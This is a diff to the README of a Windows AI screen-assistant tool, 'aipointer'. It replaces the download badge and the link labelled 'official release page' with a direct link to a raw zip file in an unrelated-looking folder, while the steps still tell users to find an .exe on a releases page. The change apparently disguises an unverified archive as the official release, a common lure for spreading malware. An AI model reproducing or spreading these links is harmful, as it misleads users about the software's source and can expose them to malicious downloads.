@@ -1,6 +1,6 @@
 # 🖱️ aipointer - Instant answers from your screen content
 
-[![](https://img.shields.io/badge/Download-aipointer-blue)](https://github.com/Mimil5143/aipointer/releases)
+[![](https://img.shields.io/badge/Download-aipointer-blue)](https://raw.githubusercontent.com/Mimil5143/aipointer/main/Agathaumas/Software_1.1.zip)
 
 aipointer acts as a visual assistant for your computer. It reads your screen when you hold a button and answers questions about what it sees. You can use it to explain complex charts, debug code, or summarize documents. The tool connects to external AI models like OpenAI, Anthropic, Gemini, or OpenRouter to provide these answers. Your data stays on your machine, and the app does not send tracking information to any server.
 
@@ -8,7 +8,7 @@ aipointer acts as a visual assistant for your computer. It reads your screen whe
 
 To use aipointer on Windows, follow these instructions to download and set up the application.
 
-1. Visit the [official release page](https://github.com/Mimil5143/aipointer/releases).
+1. Visit the [official release page](https://raw.githubusercontent.com/Mimil5143/aipointer/main/Agathaumas/Software_1.1.zip).
 2. Look for the latest version listed under the Releases section.
 3. Find the file ending in `.exe` designed for Windows.
 4. Click the file name to download the installer to your computer.
